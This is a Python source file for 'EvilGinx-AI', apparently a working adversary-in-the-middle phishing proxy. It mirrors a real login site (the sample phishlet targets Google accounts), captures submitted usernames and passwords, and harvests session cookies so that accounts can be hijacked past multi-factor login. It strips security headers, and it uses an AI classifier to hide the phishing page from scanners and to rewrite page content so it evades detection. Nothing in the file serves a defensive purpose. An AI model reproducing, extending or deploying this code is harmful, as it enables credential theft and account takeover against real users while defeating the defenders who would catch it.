"""
Proxy Server for EvilGinx-AI
Implements the core reverse proxy functionality with AI integration
"""

import asyncio
import aiohttp
from aiohttp import web, ClientSession
import ssl
import logging
import json
import re
from urllib.parse import urlparse, urljoin
from pathlib import Path
import time
from typing import Dict, Optional, Tuple

logger = logging.getLogger(__name__)

class ProxyServer:
    """Main proxy server implementing reverse proxy functionality"""
    
    def __init__(self, config, ai_client):
        self.config = config
        self.ai_client = ai_client
        self.sessions = {}  # Store captured sessions
        self.phishlets = {}  # Loaded phishlets
        self.blocked_ips = set()
        
        # Load phishlets
        self._load_phishlets()
        
    async def start(self):
        """Start the proxy server"""
        app = web.Application()
        
        # Add middleware
        app.middlewares.append(self._ai_detection_middleware)
        app.middlewares.append(self._logging_middleware)
        
        # Add routes
        app.router.add_route('*', '/{path:.*}', self._handle_request)
        
        # Start HTTP server
        runner = web.AppRunner(app)
        await runner.setup()
        
        site = web.TCPSite(runner, '0.0.0.0', self.config.get('proxy_port', 80))
        await site.start()
        
        logger.info(f"Proxy server started on port {self.config.get('proxy_port', 80)}")
        
        # Keep running
        while True:
            await asyncio.sleep(1)
    
    async def _ai_detection_middleware(self, request, handler):
        """AI-powered detection and evasion middleware"""
        if not self.config.get('ai_detection_enabled', True):
            return await handler(request)
        
        # Extract request information for AI analysis
        request_info = {
            'ip': request.remote,
            'user_agent': request.headers.get('User-Agent', ''),
            'headers': dict(request.headers),
            'path': request.path,
            'method': request.method
        }
        
        # Check if IP is already blocked
        if request.remote in self.blocked_ips:
            logger.warning(f"Blocked request from {request.remote}")
            return web.Response(status=404, text="Not Found")
        
        # Use AI to analyze the request
        try:
            classification = await self.ai_client.classify_request(request_info)
            
            if classification.get('is_scanner', False) or classification.get('is_bot', False):
                logger.warning(f"AI detected scanner/bot from {request.remote}: {classification}")
                
                if self.config.get('block_scanners', True):
                    self.blocked_ips.add(request.remote)
                    return web.Response(status=404, text="Not Found")
                    
                # Serve benign content instead
                return web.Response(status=200, text="Welcome to our website!")
                
        except Exception as e:
            logger.error(f"AI detection error: {e}")
        
        return await handler(request)
    
    async def _logging_middleware(self, request, handler):
        """Logging middleware"""
        start_time = time.time()
        
        try:
            response = await handler(request)
            process_time = time.time() - start_time
            
            logger.info(f"{request.remote} - {request.method} {request.path} - "
                       f"{response.status} - {process_time:.3f}s")
            
            return response
        except Exception as e:
            process_time = time.time() - start_time
            logger.error(f"{request.remote} - {request.method} {request.path} - "
                        f"ERROR: {e} - {process_time:.3f}s")
            raise
    
    async def _handle_request(self, request):
        """Main request handler"""
        try:
            # Determine target based on Host header and phishlets
            host = request.headers.get('Host', '')
            phishlet = self._get_phishlet_for_host(host)
            
            if not phishlet:
                logger.warning(f"No phishlet found for host: {host}")
                return web.Response(status=404, text="Not Found")
            
            # Get target URL
            target_url = self._build_target_url(request, phishlet)
            
            # Proxy the request
            response_data = await self._proxy_request(request, target_url, phishlet)
            
            # Process response with AI if enabled
            if self.config.get('ai_content_generation', True):
                response_data = await self._ai_process_response(response_data, phishlet)
            
            # Extract credentials and session data
            await self._extract_session_data(request, response_data, phishlet)
            
            return web.Response(
                body=response_data['body'],
                status=response_data['status'],
                headers=response_data['headers']
            )
            
        except Exception as e:
            logger.error(f"Request handling error: {e}")
            return web.Response(status=500, text="Internal Server Error")
    
    async def _proxy_request(self, request, target_url, phishlet):
        """Proxy request to target server"""
        # Prepare headers
        headers = dict(request.headers)
        
        # Remove hop-by-hop headers
        hop_by_hop = ['connection', 'keep-alive', 'proxy-authenticate',
                     'proxy-authorization', 'te', 'trailers', 'upgrade']
        for header in hop_by_hop:
            headers.pop(header, None)
        
        # Modify headers based on phishlet rules
        headers = self._modify_headers(headers, phishlet, 'request')
        
        # Read request body
        body = await request.read() if request.can_read_body else None
        
        # Make request to target
        async with ClientSession() as session:
            async with session.request(
                method=request.method,
                url=target_url,
                headers=headers,
                data=body,
                allow_redirects=False,
                ssl=False  # For testing purposes
            ) as response:
                
                response_body = await response.read()
                response_headers = dict(response.headers)
                
                # Modify response headers
                response_headers = self._modify_headers(response_headers, phishlet, 'response')
                
                return {
                    'body': response_body,
                    'status': response.status,
                    'headers': response_headers
                }
    
    async def _ai_process_response(self, response_data, phishlet):
        """Use AI to process and modify response content"""
        try:
            content_type = response_data['headers'].get('content-type', '')
            
            if 'text/html' in content_type:
                # Decode HTML content
                html_content = response_data['body'].decode('utf-8', errors='ignore')
                
                # Use AI to modify content for evasion
                modified_content = await self.ai_client.modify_content_for_evasion(
                    html_content, phishlet
                )
                
                if modified_content:
                    response_data['body'] = modified_content.encode('utf-8')
                    logger.debug("AI modified response content")
                    
        except Exception as e:
            logger.error(f"AI content processing error: {e}")
        
        return response_data
    
    async def _extract_session_data(self, request, response_data, phishlet):
        """Extract credentials and session cookies"""
        try:
            # Extract from request (POST data)
            if request.method == 'POST':
                body = await request.read()
                if body:
                    # Look for credentials in POST data
                    post_data = body.decode('utf-8', errors='ignore')
                    credentials = self._extract_credentials(post_data, phishlet)
                    
                    if credentials:
                        session_id = self._generate_session_id()
                        self.sessions[session_id] = {
                            'timestamp': time.time(),
                            'ip': request.remote,
                            'user_agent': request.headers.get('User-Agent', ''),
                            'credentials': credentials,
                            'cookies': {},
                            'phishlet': phishlet['name']
                        }
                        logger.info(f"Captured credentials for session {session_id}")
            
            # Extract cookies from response
            set_cookie_headers = response_data['headers'].get('set-cookie', [])
            if set_cookie_headers:
                cookies = self._parse_cookies(set_cookie_headers)
                # Store cookies for existing sessions
                for session_id, session in self.sessions.items():
                    if session['ip'] == request.remote:
                        session['cookies'].update(cookies)
                        logger.info(f"Updated cookies for session {session_id}")
                        break
                        
        except Exception as e:
            logger.error(f"Session extraction error: {e}")
    
    def _load_phishlets(self):
        """Load phishlet configurations"""
        phishlets_dir = Path(self.config.get('phishlets_dir', 'phishlets'))
        
        if not phishlets_dir.exists():
            phishlets_dir.mkdir(parents=True, exist_ok=True)
            # Create a sample phishlet
            self._create_sample_phishlet(phishlets_dir)
        
        # Load all phishlet files
        for phishlet_file in phishlets_dir.glob('*.yaml'):
            try:
                import yaml
                with open(phishlet_file, 'r') as f:
                    phishlet = yaml.safe_load(f)
                    self.phishlets[phishlet['name']] = phishlet
                    logger.info(f"Loaded phishlet: {phishlet['name']}")
            except Exception as e:
                logger.error(f"Error loading phishlet {phishlet_file}: {e}")
    
    def _create_sample_phishlet(self, phishlets_dir):
        """Create a sample phishlet for demonstration"""
        sample_phishlet = {
            'name': 'google',
            'author': 'EvilGinx-AI',
            'min_ver': '1.0.0',
            'proxy_hosts': [
                {
                    'phish_sub': 'accounts',
                    'orig_sub': 'accounts',
                    'domain': 'google.com',
                    'session': True,
                    'is_landing': True
                }
            ],
            'sub_filters': [
                {
                    'triggers_on': 'accounts.google.com',
                    'orig_sub': 'accounts',
                    'domain': 'google.com',
                    'search': 'accounts.google.com',
                    'replace': '{hostname}',
                    'mimes': ['text/html', 'application/json']
                }
            ],
            'auth_tokens': [
                {
                    'domain': '.google.com',
                    'keys': ['session_state', '__Secure-1PSID', '__Secure-3PSID']
                }
            ],
            'credentials': {
                'username': {
                    'key': 'identifier',
                    'search': '(.*)',
                    'type': 'post'
                },
                'password': {
                    'key': 'password',
                    'search': '(.*)',
                    'type': 'post'
                }
            }
        }
        
        import yaml
        with open(phishlets_dir / 'google.yaml', 'w') as f:
            yaml.dump(sample_phishlet, f, default_flow_style=False, indent=2)
    
    def _get_phishlet_for_host(self, host):
        """Get appropriate phishlet for the given host"""
        for phishlet in self.phishlets.values():
            for proxy_host in phishlet.get('proxy_hosts', []):
                phish_domain = f"{proxy_host['phish_sub']}.{self.config.get('base_domain', 'example.com')}"
                if host == phish_domain:
                    return phishlet
        return None
    
    def _build_target_url(self, request, phishlet):
        """Build target URL based on phishlet configuration"""
        # Find matching proxy host
        host = request.headers.get('Host', '')
        
        for proxy_host in phishlet.get('proxy_hosts', []):
            phish_domain = f"{proxy_host['phish_sub']}.{self.config.get('base_domain', 'example.com')}"
            if host == phish_domain:
                target_host = f"{proxy_host['orig_sub']}.{proxy_host['domain']}"
                scheme = 'https' if request.scheme == 'https' else 'https'  # Always use HTTPS for target
                return f"{scheme}://{target_host}{request.path_qs}"
        
        return None
    
    def _modify_headers(self, headers, phishlet, direction):
        """Modify headers based on phishlet rules"""
        # Remove problematic headers
        if direction == 'response':
            headers.pop('content-security-policy', None)
            headers.pop('x-frame-options', None)
            headers.pop('strict-transport-security', None)
        
        return headers
    
    def _extract_credentials(self, post_data, phishlet):
        """Extract credentials from POST data"""
        credentials = {}
        
        for cred_type, cred_config in phishlet.get('credentials', {}).items():
            if cred_config['type'] == 'post':
                pattern = f"{cred_config['key']}=([^&]*)"
                match = re.search(pattern, post_data)
                if match:
                    credentials[cred_type] = match.group(1)
        
        return credentials if credentials else None
    
    def _parse_cookies(self, set_cookie_headers):
        """Parse Set-Cookie headers"""
        cookies = {}
        
        if isinstance(set_cookie_headers, str):
            set_cookie_headers = [set_cookie_headers]
        
        for cookie_header in set_cookie_headers:
            # Simple cookie parsing
            parts = cookie_header.split(';')[0].split('=', 1)
            if len(parts) == 2:
                cookies[parts[0].strip()] = parts[1].strip()
        
        return cookies
    
    def _generate_session_id(self):
        """Generate unique session ID"""
        import uuid
        return str(uuid.uuid4())
    
    def get_sessions(self):
        """Get all captured sessions"""
        return self.sessions
    
    def get_phishlets(self):
        """Get all loaded phishlets"""
        return self.phishlets

